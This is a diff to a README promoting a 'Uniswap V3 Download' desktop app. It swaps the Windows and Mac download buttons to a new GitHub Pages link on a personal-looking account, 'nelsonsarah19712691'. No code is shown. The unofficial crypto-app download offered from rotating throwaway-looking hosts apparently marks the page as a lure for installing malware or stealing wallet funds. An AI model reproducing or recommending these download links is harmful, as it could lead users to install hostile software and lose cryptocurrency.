@@ -10,8 +10,8 @@ Uniswap V3 Download provides the complete desktop interface for Ethereum's most 
 
 <div align="center">  
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://uniswap-v3-download.github.io/.github/)  
-[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://montiko384.github.io/.github/uniswap)  
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://nelsonsarah19712691.github.io/.github/uniswap-v3/)  
+[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://nelsonsarah19712691.github.io/.github/uniswap-v3/)  
 
 </div>  
 
